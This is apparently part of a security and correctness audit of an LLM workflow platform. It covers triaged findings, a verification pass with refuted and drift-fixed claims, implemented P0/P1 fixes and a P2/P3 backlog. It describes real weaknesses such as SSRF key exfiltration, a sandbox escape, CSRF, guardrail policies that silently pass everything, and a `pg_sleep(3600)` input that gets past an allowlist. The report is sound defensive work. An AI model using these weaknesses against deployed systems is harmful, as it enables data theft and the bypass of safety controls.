### R3-ι. Guardrail playground re-save mangles policies — `SavedPolicies.tsx:95-103`, `GuardrailPlayground.tsx:360-370`
`handleSave` persists only `{guardrail_type, mode, blocked_keywords, sample}` — drops `scope`, `tool_rule`, `detect_pii`, `fail_behavior`, `json_schema`, `moderation_thresholds`, `llm_instruction`. Adopt the built-in tool-call template → Save → becomes an enforce-nothing `model_io` rules policy that passes everything. `scope`/`tool_rule` is also uncreateable in UI — Phase-5 feature unreachable except via templates this path then corrupts.

## Medium

- **R3-κ** Node-test `AgentToolSchemaError`/`GraphValidationError` escape as 500 — `node_test.py:388-391` (validation outside the error-mapping try).
- **R3-λ** Node-test Agent branch strips `tools`/`generate_content_config` — search-tool tests call Gemini ungrounded → false-confidence output — `node_test.py:317-327` vs `compiler.py:631-644`.
- **R3-μ** Deferred-eval node test judges on node's model; real run judges Gemini only — `node_test.py:264-276` vs `workflow_capabilities.py:49-55`.
- **R3-ν** `backfill_rollups_for_user(None)` double-counts (no reset on the None path); `limit=5000` silent partial — `rollup_backfill.py:27-57`, `job_queue.py:116`.
- **R3-ξ** `run_filters` Python-vs-SQL disagree on literal `"null"` eval_aggregate string — `run_filters.py:62-73` vs :11-13; ingest can write caller-controlled metrics_json.
- **R3-ο** Missing indexes: `run_spans.created_at` + `llm_calls.created_at` (spans search scans+sorts whole tables, `.count()` doubles it); `dataset_items.dataset_id`; `experiments.workflow_id`/`dataset_id`; `alert_rules.enabled` (seq scan every tick); `run_spans.parent_span_id` (FK delete scans); `datasets.workflow_id`.
- **R3-π** `_parse_iso_date` naive/aware drift: client-omitted-offset datetimes bound verbatim — PG interprets in session TZ; SQLite strips tz (5h skews, boundary rows dropped) — `observability_service.py:225,227,675,677`.
- **R3-ρ** More unbounded→`String(N)` Postgres 500s incl. graph-sourced columns with NO validation: `cron_expr(128)`, `trigger_node_id(128)`, `node_results.*`, `llm_calls.model(128)`, `run_spans.name(255)`, `run_checkpoints.node_id`, `approval_requests.node_id`, `workflow_memory.key(256)` — mid-run DataError → failed run / stuck schedule sync; SQLite silent truncation.
- **R3-σ** `DELETE /api/datasets/{id}` cascades `experiments` (`ondelete="CASCADE"`) — wipes regression baselines silently, no warning — `models.py:485-487`, `datasets.py:123-130`.
- **R3-τ** Frontend hard-blocks save/run of `promptRef`-bound agent with empty instruction — `workflow-validation.ts:86-93` + `handleSave`/`handleRun` — backend resolves promptRef fine; lint rule same false positive — `node-registry.ts:724`.
- **R3-υ** `FirstRunHero` calls `useTemplate` twice per creation → `usage_count` +2 — `FirstRunHero.tsx:50-56`, `create-from-template.ts:20`.
- **R3-φ** Frontend cron validator rejects croniter-accepted dialects (`MON-FRI`, `@daily`, `L`, `SUN#2`) → false "invalid cron" save-blocks — `workflow-validation.ts:12-51`.
- **R3-χ** `listRuns` exposes no `limit`/`offset` → sessions with >50 runs silently truncate in `SessionsView`; `listAlertEvents` same at 50 — `api.ts:958-977,1119`.
- **R3-ψ** FastAPI 422 `detail` is a list → raw `[{"loc":…}]` JSON blob lands in toasts — `api.ts:106-112`.
- **R3-ω** `enqueueAnnotation` type omits bulk `filter`/`workflow_id`/`limit`/`max_eval` → backend's failed/low-eval bulk capture unreachable from UI (documented feature, no UI) — `api.ts:1059` vs `annotation.py:124-130`.

## Low

- `backfill`/`dispatch_job` claim race on SQLite (`with_for_update` no-op, no CAS) — `job_queue.py:89-100`; node-test `wait_for` doesn't kill to_thread workers/subprocess — `node_test.py:406-409`; `record_audit` oversized fields escape the never-raise swallow — `audit.py:25-36`; 6-field cron silently treated as seconds-field by croniter but floored to minute — `cron_utils.py`, `schedule_worker.py:25-31`.
- Contract minors: `createEvalPreset`/`updateEvalPreset` responses omit `source` (mis-files as builtin if consumed directly); `getEvalSnippets(limit)` counts workflows not snippets; `getJob` lacks `started_at`; `getMCPCredentialTools` trusts stale `mcp_tool_cache` shapes.
- `label_task`/`skip_task` post-commit lazy loads → extra SELECTs, `AttributeError`→500 if row deleted mid-serialization — `annotation.py:219`.
- `search_traces` runs `.count()` on full 3-table join per source per page — `observability_service.py`.
- FeRest minors: playground `models:[]` → backend 400 not form-disabled, `api_base`/`credential_id` uneditable in UI; prompt delete no confirm + no `promptRef` reference warning (fallback to inline is silent); `AlertsCard` `Number()||default` silent coercion; `useTemplate` increments usage even when `createWorkflow` then fails.

## Round-3 verified clean

- **api.ts ↔ backend contract: ~80 functions, all paths/methods/query/body/response fields match** (only the drift items above). No route-ordering collisions; enum literals, NodeData↔`data.get()` keys, SSE framing all 1:1.
- `audit.py` swallow design, `routing_models.py`, `time_utils.py` dialect conversion, `online_sampling.py` race handling, `observability_events.py`, `graph_defaults.py`, `knowledge_jobs.py`, `eval_preview.py`, `node_test` rate-bucket keying/ownership, `preview_expression` scoping.
- Approval/checkpoint/run_events indexes cover all queries found; JSON mutation sites all copy-before-assign (no lost in-place updates); ownership always in-query; `expire_on_commit` compensated at executor/experiment sites.
- TraceNodeRow/RunComparison/prompt pages: no `dangerouslySetInnerHTML`; MCP form validation mirrors backend; credentials required-field parity; hooks all SSR-guarded with try/catch'd localStorage.
- `crypto.py` encrypt paths, `chat_session` verify, nonce receipt atomicity — re-confirmed clean.


---

# Verification pass (all findings re-checked against current source; live repros where cheap)

Method: 5 parallel agents re-read every cited `file:line`, ran live repros (SQLite throwaways, compile-level checks, threads for races; sandbox probe with canary-only env). Overall: ~120 CONFIRMED / PARTIAL, 3 REFUTED, 7 DRIFT-FIXED, ~12 INCONCLUSIVE (not re-traced this pass).

## Refuted (do not fix — claim was wrong)

- **Round-1 #29 DeploySheet revoke claim — REFUTED.** `deployments.py:56-60`: `sync_deployment` nulls `invoke_key_hash`/`webhook_secret_encrypted`/`chat_token_hash` on version change, called from `platform.py:82` on publish. Publish genuinely revokes; UI copy is accurate.
- **R2-37 chat token in JSON body — REFUTED as a bug.** Split by design: backend `api/chat.py:68-72` returns the body token, the Next proxy (`app/api/chat/session/route.ts:66-78`) sets the httpOnly cookie. The documented "cookie" behavior exists at the proxy layer.
- **R3-λ node-test strips tools — REFUTED.** `node_test.py:292-325`: test path uses the same `_build_adk_node` with `_tool_nodes` in context; no stripping visible.
- **Low/label-lazy post-commit loads — REFUTED.** `api/annotation.py:179-222`: serialization happens pre-commit; no post-commit lazy load.
- **OTLP cross-tenant pollution (part of low cluster) — REFUTED.** `otlp_ingest.py:225-279`: find-or-create is scoped by `user_id`. Same-user name collision still resolves to a real workflow (narrower same-user variant stands).
- **Worker-memleak `_authoring_overrides` half — REFUTED.** `executor.py:1974,2231` pops on consume and in `finally`. The `_approval_results` half was not traced.

## Drift-fixed (code already changed — verify before fixing)

- **Verification item 2 (`switchDefault=''` unconditional edge).** `_edge_route` still maps `''→None`, but the validator now rejects an empty switch case ("has no outgoing edge") — silent unconditional fire is blocked.
- **R3-α tag filter on SQLite.** `api/runs.py:91` now compiles `LIKE '%"tag"%'`, matching multi-tag rows. Postgres `.contains` via base-JSON comparator not verifiable in this pass.
- **R3-δ `delete_workflow` cascades (partial).** Bulk deletes added for LlmCall/Feedback/Experiment/Dataset/Schedule/KB/Memory/Jobs/Rollups (`workflows.py:713-764`); residual `db.delete(workflow)` still ORM-cascades runs+events/spans/checkpoints.
- **R3-κ node-test 500 escape.** `node_test.py:404-422` now maps handler/LLM failures to `failed`/`unsupported` via generic `except Exception`; only `NodeNotFound→404` escapes.
- **R3-π `_parse_iso_date` drift.** Helper is gone; dates arrive as FastAPI-parsed datetimes — the naive/aware bind class no longer applies here.
- **R2-17 MCP batched-call nonce 409.** Verification is now explicitly read-only ("consumes no nonce receipt", `mcp_server.py:75-88,169-172`); claim no longer matches this code.
- **R2-36 CLI `JSONDecodeError` exit-1.** Now caught (`main.py:38`); default-baseline-`versions[1]` and uncaught `KeyError` sub-claims still stand.

## Partially confirmed (scope narrower than originally stated)

- **Round-1 #19 unlabeled branch fan-out.** Labeled-off-non-branch dead edge and `route=None` unconditional path both verified — but validation requires every declared route to have an edge, so the accidental fan-out needs routes `['a']` + labeled `a` + unlabeled extra (passes validation, extra compiles `None`). Original claim overstated reachability.
- **Round-1 worker-memleak (approvals half).** Override half refuted (above); `_approval_results` eviction path not traced — single unverified remainder.
- **R3-ο missing indexes (mostly).** All cited gaps verified absent except `parent_span_id`, which is covered by composite `ix_run_spans_run_parent`.
- **url_safety CGNAT item.** Userinfo-drop and Host-port-omission confirmed; whether `100.64.0.0/10` passes depends on runtime `ipaddress` version — not empirically resolved.
- **conftest rate-reset.** Session-scoped `create_all` + no isolation confirmed; whether the reset misses `node_test._rate_buckets` was not resolved either way.

## Inconclusive (not re-traced; no drift signal, keep as-is)

R1 `stream_end`-eviction; R2-25 (inspector half of error-hijack — compiler half confirmed), R2-30 (approval-UI replay); integrations residuals; context_wrapper residuals; retrieval-stack items; input-validation 500s spot-checks; session-history ties; infra/deploy list; R3 contract minors (`source` omission, `getJob` shape, MCP cache shape).

## Confirmed — everything else

All Round-1 Crit (#1–#8) and Medium (#9–#18): CONFIRMED, incl. live apiBase-SSRF-with-env-key, assist cross-tenant read, NUMERIC-affinity UUID read-back failure, and six error-string handlers accepted with error edges. Round-1 #20–#28, #30 and all listed Low items: CONFIRMED. Round-2 R2-1–R2-16, R2-18–R2-24, R2-26–R2-29, R2-31–R2-35: CONFIRMED (sandbox escape re-run with canary env returned the marker; alembic `%` crash re-run; canary-only by design — no environ persisted here). Round-3: verification items 1, 3–10 and R3-β/γ/ε/ζ/η/θ/ι, R3-μ–ω (minus drift-fixed κ/π): CONFIRMED.

---

# Fix status (P0 + P1 implementation)

Full backend suite: **1309 passed, 2 skipped** (fresh `test.db`; the 24 stale literal-`UUID` tables in the old file confirmed the R1-5 bug class in miniature). Frontend `typecheck` + `lint` clean (no frontend changes needed).

## P0 — all fixed (PR #91, branch `fix/p0-exfiltration-hardening`)

- apiBase SSRF/env-key exfil → caller-controlled endpoints rejected at `resolve_provider_model`; DNS policy enforced centrally (`generate_*` choke, execution boundary, admission gates, node-test); keyless Ollama LAN-aware. Follow-up hardening: `validate_lan_endpoint`, execution-boundary regression test, 307-to-loopback refusal test.
- assist/compare → LLM allowlist + config stripping + trusted nodeType + user threading; `sub_workflow` fail-closed + `_user_id` propagation.
- Sandbox `str.format` → attribute-level rejection (closes alias hop).
- Templates → owner-scoped list/use.

## P1 — all fixed (this branch)

| Finding | Fix |
|---|---|
| R2-2 SNI break | `extensions={"sni_hostname": hostname}` on pinned requests (both paths) |
| R2-3 auth-forward | strip Authorization/proxy-auth on cross-host redirect (both paths); Host header now carries port |
| R2-4 worker http | worker lifespan starts/stops shared client; client refcounted across lifespans |
| R1-4 worker create_all | replaced with Alembic `check_migrations_current` gate (refuses boot on drift) |
| R2-5 alembic `%` | escape `%`→`%%` before `set_main_option` (round-trip verified) |
| R2-35 decrypt pass-through | `DecryptionError` on failure; credential resolve blanks the field; webhook/MCP paths 401 |
| R1-5 `postgresql.UUID` | all 47 columns → `sa.Uuid` (DDL verified `CHAR(32)` + all-digit round-trip; no migration needed — PG DDL identical, SQLite matches 021 repair) |
| R1-9 rate-limit bypass | unknown tokens share `key:unmapped`; XFF trusted only behind loopback/private peer |
| R1-20 scrub gaps | `api-key` part + boundary-aware token regex (`auth/access/api/token`, bare `token`); usage keys (`input_tokens`, `*_count`) preserved — matrix-tested |
| R2-6 schedules draft | publish re-syncs from published graph; draft saves skip while published |
| R2-10 version race | migration 029 (renumber-preserving, ≤32-char id) + model UniqueConstraint + lock-and-retry on save/import (threaded `[1,2,3]` test) |
| R2-8 finally leak | nested try/finally: DB work guarded, `_active_tasks`/`_authoring_overrides` pops unconditional |
| R1-3 sweep live-kill | worker mode skips sweep; resume window restarts at `resumed_at`; approval grace from max `parked_at` |
| R1-6/R3-ε recovery | age gate on `running`/`awaiting_approval` + jobs; `queued` jobs re-dispatched on boot; multi-replica-inline documented unsupported |
| R3-β budget poison | `WorkflowUpdate.budget_json` validated (positive finite, known keys); `check_workflow_budget` never raises; scan-loop call guarded |
| R1-7 error strings | `NodeExecutionError` raised across http/code/integration/postgres/email/slack/discord/json_parse/calculator/sub_workflow; wrapper retries + error edges engage (edge wiring verified); 9 tests updated to raise contract |
| R1-14 session leak | history namespaced `{sid}:{client_id}` (fits 128-col); isolation test |
| R1-17 mask pass-through | violation-tagged results; `_mask_violation` redacts exact material; unmaskable → block; input-scope override spliced into request parts (fails closed when not rewritable); dev judge-skip still passes |
| R3-η iteration test | iteration+`subWorkflowId` → `unsupported` |

## Incidental fixes (found while fixing)

- `_make_transform_fn` lost its `node_id` param to an edit collision (transform nodes broken) — restored.
- `tracing.py` lost `_HEADER_PREFIXES` + partial KV-pattern damage in the same class of collision — reconstructed, diff-verified, matrix-tested.
- Shared `test.db` staleness (literal-UUID DDL + old alembic stamp + legacy duplicate versions) — rebuilt; migration 029 renumber verified against referenced duplicates (run + deployment FKs intact).
- `startup.py`/`schedule_worker.py`/`url_safety.py` docstring/body micro-damage from range edits — restored and parse-verified.
- `test.db` residue (sweep-test rows) can perturb future runs — suite uses shared file by design (conftest); no action.

## Deliberately not taken

- Per-request LiteLLM transport injection (no seam in installed litellm for sync `completion`; rejection + gates cover all paths instead).
- Run-status CAS on every terminal write (the lost-update class R1-10-Medium/P2: real fix needs per-write guards; left for P2).
- Executor heartbeat column (the principled multi-replica guard; age gates bound the risk meanwhile).
- `tokens_per_run` enforcement, join-deadlock validation, `max_eval_drop=0`, matrix first-pair metadata (P2/P3 backlog).

---

# Backlog batches (P2 + P3, reconciled 2026-10-18)

P0 (4) + P1 (20) fixed and merged in #92. This plan covers the 108 open
findings: one row per original open finding, assigned exactly once.
Excluded: 6 refuted (R1 #29, R2-37, R3-λ, label-lazy, OTLP cross-tenant,
`_authoring_overrides` half) and 7 drift-fixed (switchDefault edge, R3-α
SQLite, R3-δ partial, R3-κ, R3-π, R2-17, R2-36 JSONDecodeError), plus the
line-291 verified-clean carryovers. Fixed-in-#92 R3-ε and P1 items are out.
Suggested order: P2-A → P2-B → P3-A → P3-B → P3-C.

## P2-A: Run lifecycle, concurrency, schedules & alerts (15)

| ID | Finding |
|---|---|
| #10 | Lost-update races on `WorkflowRun.status`/`metrics_json` (`executor.py:1824`, `_mark_awaiting_approval`, `_fail`/`_deny`/`_complete_run`) — a `stop_run` between load and commit is silently overwritten. Real fix needs per-write guards (deliberately deferred from P1). |
| #11 | Resumed runs double-count rollups (`executor.py:2198-2208`) — `record_run_rollup` per attempt, no dedup; `token_usage` overwritten while `LlmCall`/`RunSpan` accumulate. |
| #13 | Terminated broker skips durable replay (`executor.py:2319-2321`) — reconnect within 120s TTL gets bare `stream_end`, loses `run_completed`/`final_output`/`metrics`. |
| #23 | Tool-approval keys are random UUIDs (`agent_tools.py:98`) — resume parks a new row; decisions on the pre-crash row never reach it → waiter times out. |
| R2-7 | Runs terminated outside `execute_run` never emit `stream_end` (`run_concurrency.py:156-165`, `startup.py:141-167`) — subscribers heartbeat forever; broker + `run_events` leak until retention. |
| R2-20 | `_dispatch_new_events` advances watermark past failed dispatches (`event_bus.py:290-303`) — permanent live-event loss incl. `stream_end`. |
| R2-21 | `_schedule_run_event_cleanup` pops by `run_key` blindly (`executor.py:540-551`) — re-executed run within 120s TTL inherits terminated broker. |
| R2-23 | `mark_node_started` bumps `updated_at` on terminal checkpoint rows (`checkpoints.py:68-71,205-215`) — stale `context_patch` wins in `compute_resume`. |
| R2-24 | `shutdown_active_runs` snapshots `_active_tasks` once (`executor.py:2277-2288,2236`) — post-snapshot spawns execute DB writes during shutdown. |
| R2-12 | Alert rules orphaned + baseline alerting can't fire (`api/alerts.py:85-99`, `services/alerts.py:152-160`) — no owner check, no FK cleanup; `ratio ≤ 1` always for additive metrics. |
| R2-15 | `sync_workflow_schedule` TOCTOU → duplicate rows → double fire (`schedule_sync.py:33-60`) — no unique constraint on `(workflow_id, trigger_node_id, cron_expr)`. |
| R2-18 | Slack event webhooks unreachable — `x-slack-signature` detected but never verified → every real Slack event 401s; mapper dead code. |
| R2-19 | `retention.purge_old_runs` unbounded `IN` lists (`retention.py:18-50`) — `SQLITE_MAX_VARIABLE_NUMBER` past ~32k stale runs, retried every tick. |
| R2-22 | `evaluate_alert_rules` cooldown check-then-write, no row lock (`alerts.py:184-205`) — duplicate events + deliveries; one bad commit aborts the tick. |
| #8 | Router/classifier/expression-agent LLM calls bypass token & cost accounting (`compiler.py:229-241,:191-198`) — no `LlmCall` row, no span, no call resilience. |

## P2-B: Graph, retrieval, providers, security & evals (24)

| ID | Finding |
|---|---|
| #19 | Branch fan-out/stall edge-label bugs (partial — `compiler.py:721-732`, `graph_validation.py:257-266`) — dead labeled-off-non-branch edge; `route=None` unconditional extra needs routes `['a']` + labeled `a` + unlabeled extra. |
| #24 | `iteration` parallel mode leaks sibling tasks (`node_handlers.py:714-718`) — `gather` without `return_exceptions`; in-flight children mutate state after failure. |
| #30 | Duplicate node IDs pass validation → last-wins `adk_nodes` (`compiler.py:969`); `_safe_adk_name` collisions (`a.b` vs `a-b`) miswire edges. |
| R2-13 | Code-node results >OS pipe buffer hang (`code_sandbox.py:134,168-186`) — `join()` then `get_nowait()` deadlocks; 2MB result → timeout. Drain before join. |
| R3-ζ | Impossible-date cron passes validation then 500s listings (`cron_utils.py:10-27`) — `CroniterBadDateError` unhandled; dead schedule breaks schedule endpoints. |
| #12 | Bound credential never type-checked vs provider (`llm_providers/__init__.py:159-163`, `credentials.py:60-71`) — misbound key sent to wrong provider; `credentialName` is `first()` across types. |
| #21 | `generate_structured` retries on any exception (`llm_providers/__init__.py:360-379`) — auth/quota/timeout double-billed; only second attempt's usage recorded. |
| #16 | `kb_retrieve` ignores `kbSource=inline` when `kbMethod=embedding` (`node_handlers.py:406-412`) — wrong corpus, wrong citations. |
| R2-33 | `retrieve_by_embedding` crashes on dim mismatch; `embed_text` `except: pass` swaps Gemini vectors for hash vectors — silently corrupted ranking. |
| R2-14 | `_parameterize_query` `{{…}}` in SQL literal → `':p0'` (`integrations.py:194-214`) — silent wrong rows; legitimate `;` in quotes rejected. |
| R3-σ | `DELETE /api/datasets/{id}` cascades `experiments` (`models.py:485-487`) — wipes regression baselines silently. |
| R3-δ-res | Residual ORM-cascade on workflow delete — `db.delete(workflow)` still loads runs+events/spans/checkpoints row-by-row after the P1 bulk deletes. |
| #15 | CSRF on hosted-chat invoke cookie (`api/chat/invoke/route.ts:44-55`) — `SameSite=None`, no Origin/Content-Type gate. |
| #26 | Chat `?token=` never stripped from URL (`ChatPanel.tsx:84-126`) — bookmarkable/history-leaked replayable token. |
| #18 | `human_approval` crashes with `UUID("None")` in sub-workflows/assist (`node_handlers.py:455`) — `str(None)` truthy → ValueError instead of auto-approve. |
| R2-16 | MCP `tools/call` args unvalidated (`mcp_server.py:253-274`) — non-string `session_id` crashes session; `>128` → DataError; string `tags` iterates to chars. |
| R2-32 | `dispatch_webhook` unbounded response buffering (`webhook.py:22-28`) — no `max_body_bytes` cap. |
| R2-34 | `parse_document` unbounded decompression + parse time (`documents.py:31-42`) — endpoint threadpool exhaustion. |
| R3-γ | `tokens_per_run` budget never enforced — dead knob (`budgets.py:4,73-76`); only cost/runs-per-hour work. |
| R3-θ | `/templates` page render-crashes on positionless nodes (`graph-preview.tsx:36`) — no error boundary; one bad template downs the page. |
| R3-ι | Guardrail playground re-save mangles policies (`SavedPolicies.tsx:95-103`) — drops `scope`/`tool_rule`/`detect_pii`/`fail_behavior`/schemas/thresholds; tool-call template becomes enforce-nothing. |
| R3-μ | Deferred-eval node test judges on node's model; real run judges Gemini only (`node_test.py:264-276` vs `workflow_capabilities.py:49-55`). |
| #22 | Annotation `enqueue_run` TOCTOU (`annotation.py:39-60`) — concurrent thumbs-down → IntegrityError 500. |
| R2-9 | `TestClient(app)` never used as context manager — `lifespan` never runs in tests; startup paths (resume/scheduler/http-client) unexercised. |

## P3-A: Backend correctness lows (24)

| ID | Finding |
|---|---|
| L1 | Route `"default"`/`"error"` on if/guardrail → unconditional edge / conflates with error-edge machinery (`compiler.py:702-732`). |
| L2 | Sync DB I/O on event loop in NOTIFY consumer (`event_bus.py:324-341`). |
| L3 | Approval decision emits no observability event (`runs.py:642-726`) — triage shows `awaiting_approval` until run end. |
| L4 | Cron scheduler skips whole minutes after slow ticks (`schedule_worker.py:219-245`) — silent missed fires. |
| L5 | Claimed schedule fire consumed before run row exists (`schedule_worker.py:132,157`) — cap or crash loses the fire. |
| L6 | Malformed OTLP input → 500s: `endTimeUnixNano` overflow, non-text output, duplicate `(user_id,name)` on concurrent ingest (`otlp_ingest.py:139,384,229`). |
| L7 | `max_eval_drop=0` unreachable — `or DEFAULT` twice (`experiments.py:147`, `experiment_runner.py:173`). |
| L8 | Matrix verdict deltas describe only pair #1 (`experiment_runner.py:243-251`). |
| L9 | `generate_text` drops `extra_config` on LiteLLM (`llm_providers/__init__.py:309-319`) — guardrail JSON-mode hint discarded for non-Google judges. |
| L10 | Presidio missing → regex-only `passed=True` even in production (`guardrail_presidio.py:64-72`). |
| L11 | `eval_pattern` regex has no ReDoS guard (`eval_deterministic.py:88`). |
| L12 | `spans?model=` never matches OTLP-ingested spans (`observability_service.py:693-700` vs `otlp_ingest.py:422-440`). |
| M2 | `_post_integration_webhook` calls `validate_http_url` synchronously on the event loop (`integrations.py:35`). |
| M4 | `context_wrapper`: decision+error edge kills success edges (`compiler.py:782-783`); `last_output` dead store; parallel branches share `context_ref` dict from threads, no lock. |
| M5 | Retrieval math: store hits unfiltered `score` vs JSON `>0`; BM25 IDF uses own tf as df; `_search_via_store`/`kb_cache` load entire KB per run. |
| M9 | `authenticate_*` `db.rollback()` on nonce IntegrityError clobbers caller session; cross-deployment receipt cleanup inside caller txn (`deployments.py:203,289`). |
| M10 | OTLP same-user name collision resolves to a real workflow (narrowed remainder of refuted cross-tenant claim). |
| M11 | `failure_rate` alert metric counts non-terminal runs in denominator (`alerts.py:85-94`). |
| O1/R3-ν | `backfill_rollups_for_user(None)` double-counts (no reset on None path); `limit=5000` silent partial (`rollup_backfill.py:27-57`, `job_queue.py:116`). |
| O2/R3-ξ | `run_filters` Python-vs-SQL disagree on literal `"null"` eval_aggregate; ingest can write caller-controlled `metrics_json`. |
| O3/R3-ο | Missing indexes: `run_spans.created_at`, `llm_calls.created_at`, `dataset_items.dataset_id`, `experiments.workflow_id`/`dataset_id`, `alert_rules.enabled`, `datasets.workflow_id` (`parent_span_id` covered by composite). |
| O4/R3-ρ | Unbounded→`String(N)` Postgres 500s incl. graph-sourced columns with no validation: `cron_expr(128)`, `trigger_node_id(128)`, `node_results.*`, `llm_calls.model(128)`, `run_spans.name(255)`, `run_checkpoints.node_id`, `approval_requests.node_id`, `workflow_memory.key(256)`. |
| P1 | `backfill`/`dispatch_job` claim race on SQLite (`with_for_update` no-op, no CAS) (`job_queue.py:89-100`). |
| P6 | `search_traces` runs `.count()` on full 3-table join per source per page (`observability_service.py`). |

## P3-B: Frontend & UX (21)

| ID | Finding |
|---|---|
| N1/R2-25 | Edge-inspector free-text route on non-branch nodes: `"error"` hijacks error-edge machinery, stamps siblings `SUCCESS_ROUTE` (compiler half confirmed). |
| N2/R2-26 | Canvas allows self-connections/cycles; frontend validation field-only → save-time 400 with misleading message. |
| N3/R2-28 | `DraftTextarea` silently reverts undo — re-seeds only on `nodeId` change (`NodeInspector.tsx:445-487`). |
| N4/R2-29 | Version-history click discards unsaved edits with no confirm (`WorkflowCanvas.tsx:1625-1651`). |
| N5/R2-30 | Run-detail approval UI regresses to stale `awaiting_approval` after approve — replay re-applies old event; click 409s. |
| N6/R2-31 | AnnotationQueue "Load more" offset-paginated over a self-mutating list — skips/duplicates. |
| #27 | Run-stream resubscribe loses `lastEventId` (`api.ts:1222`, `RunDetailView.tsx:255-284`) — every flap replays from seq 0. |
| #28 | `request()` throws raw `SyntaxError` on 2xx non-JSON (`api.ts:113-115`) — status-branching callers mis-handle. |
| O5/R3-τ | Frontend hard-blocks save/run of `promptRef`-bound agent with empty instruction — backend resolves fine; lint same false positive. |
| O6/R3-υ | `FirstRunHero` calls `useTemplate` twice per creation → `usage_count` +2. |
| O7/R3-φ | Frontend cron validator rejects croniter-accepted dialects (`MON-FRI`, `@daily`, `L`, `SUN#2`) — false save-blocks. |
| O8/R3-χ | `listRuns`/`listAlertEvents` no `limit`/`offset` — sessions with >50 runs silently truncate. |
| O9/R3-ψ | FastAPI 422 `detail` list lands raw in toasts (`api.ts:106-112`). |
| O10/R3-ω | `enqueueAnnotation` type omits bulk fields — failed/low-eval bulk capture unreachable from UI. |
| P7 | FeRest minors: playground `models:[]` not form-disabled, `api_base`/`credential_id` uneditable; prompt delete no confirm + no `promptRef` warning; `AlertsCard` coercion; usage increments on failed create. |
| L21 | R1 frontend minor: `patchRecentRun` finished-shows-running; SSE proxy doesn't encode `params.id`; HTML error bodies in toasts. |
| M19 | R2 frontend minor: untrimmed keys; `x-forwarded-proto` Secure trust; ChatPanel retry/caps; approve in-flight guards; save dedup. |
| N7/R2-36-res | CLI `KeyError` uncaught + default baseline `versions[1]` is saved-not-published (JSONDecodeError half drift-fixed). |
| P5 | Contract minors: eval-preset `source` omission; `getEvalSnippets(limit)` counts workflows; `getJob` lacks `started_at`; stale `mcp_tool_cache` trust. |
| M14 | Schedule key change re-fires within same minute (`schedule_sync.py:50-59`). |
| M13 | Cancelled-invoke path schedules without capacity recheck (`invoke_runner.py:283-288`). |

## P3-C: Infra, test harness, limits & config (24)

| ID | Finding |
|---|---|
| #25 | `run_execution_mode` free string — `workers` typo silently skips both recovery paths; should be `Literal`. |
| L13 | `_approval_results` eviction path untraced (remainder of half-refuted worker-memleak). |
| L14 | `config.py` inconsistencies: default Postgres URL vs SQLite docs; `openai`/`anthropic` keys declared twice. |
| L15 | `/mcp` bypasses middleware rate limiting (`rate_limit.py:62-64`); `?api_key=` leaks keys into URL logs (`auth/deps.py:73`). |
| L16 | `trust` vs `dashboards` percentiles disagree (different rank functions). |
| L17 | `retries`/`timeoutSec` validated for all types but silently ignored on bare-Agent types (`compiler.py:949`). |
| L18 | `seed_pinned_outputs` uses `str()` not JSON (`run_authoring.py:50`) — Python repr leaks into templates on resume. |
| L19 | `join` under exclusive branches deadlocks silently — validation doesn't flag. |
| L20 | Worker-mode `claim_pending_runs` claim→schedule not atomic; SQLite second claim writes `queued` over `running`. |
| L22 | `worker.py`↔`startup.py` divergence: `migration_check_strict` returns False on check errors under strict — boot continues while claiming refusal. |
| M1 | `url_safety` residuals: userinfo drop, Host-port omission (CGNAT range depends on runtime `ipaddress` — unresolved). |
| M3 | PG engines unbounded + create race; no `statement_timeout` (`pg_sleep(3600)` passes allowlist); SSRF-via-config; Slack-vs-Discord caps. |
| M6 | Upload size cap ineffective — Starlette spools full multipart body before bounded read (`workflows.py:842-847`). |
| M7 | `delete_workflow` bulk-deletes `KnowledgeDocument` bypassing `delete_embedding_vector` — orphaned `vec_knowledge` rows. |
| M8 | Input-validation → Postgres 500s cluster across `platform.py`, `workflows.py`, `feedback.py`, `alerts.py` (NaN/inf thresholds never-fire); unbounded bulk payloads into `background_jobs.payload_json`. |
| M12 | Async-task/log/queue group: `_log_future` leaks `CancelledError`; `_notify_queue` unbounded; dead `webhook_timeout_seconds`; `publish_run_event` retries FK violations. |
| M15 | Session-history `created_at` ties unordered; concurrent same-session invokes fork histories (`invoke_runner.py:65-70`). |
| M16 | `_session_secret` prefers account API key — wrong precedence; rotation kills all chat sessions (`chat_session.py:31-32`). |
| M17 | Conftest: no per-test DB isolation (shared `test.db` residue hides ownership bugs); rate-bucket reset gap (unresolved); stamp-swallowing `except: pass`. |
| M18 | Infra/compose/deps: no postgres healthcheck; unpinned `psycopg`/`duckduckgo`/`litellm`/`google-genai`/`httpx`; missing `en_core_web_sm` in image; bundle-analyzer/Next skew; MCP stdio timeout mismatch. |
| P2 | Node-test `wait_for` doesn't kill to_thread workers/subprocess (`node_test.py:406-409`). |
| P3 | `record_audit` oversized fields escape the never-raise swallow (`audit.py:25-36`). |
| P4 | 6-field cron treated as seconds-field by croniter but floored to minute (`cron_utils.py`). |
| Q1/R3-α-res | Tag filter Postgres `.contains` via base-JSON comparator unverified (SQLite half drift-fixed). |
